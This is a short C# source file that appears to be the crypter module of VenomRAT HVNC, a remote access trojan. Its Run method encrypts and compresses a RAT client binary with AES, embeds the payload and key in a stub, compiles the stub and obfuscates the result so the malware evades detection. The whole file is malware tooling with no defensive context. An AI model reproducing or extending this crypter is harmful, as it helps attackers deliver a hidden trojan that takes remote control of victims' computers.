using System;
using System.IO;
using Client.Obfuscation;
using VenomRAT_HVNC.Crypter.Algorithms;
using VenomRAT_HVNC.Crypter.Settings;

namespace VenomRAT_HVNC.Crypter;

public class Program
{
    public static void Run(string filePathClient)
    {
        string stub = Settings.Settings.Stub;
        byte[] client = File.ReadAllBytes(filePathClient);
        string passwordAesCompress = new GenerateKey(256).GenerateStrenghCharacter();
        string codeAesCompressPayloadBase64 = Aes.AesEncryptBytes(Aes.Compress(client), passwordAesCompress);

        stub = stub.Replace("#PASSWORD_AES_COMPRESS_STUB#", passwordAesCompress);
        stub = stub.Replace("#PAYLOAD_AES_COMPRESS_STUB#", codeAesCompressPayloadBase64);
        
        Compiler.CompileCSharpFile(stub,filePathClient,null);
        Obfuscate.Run(filePathClient);
        
        //Compiler
        //fonctions replace
    }
}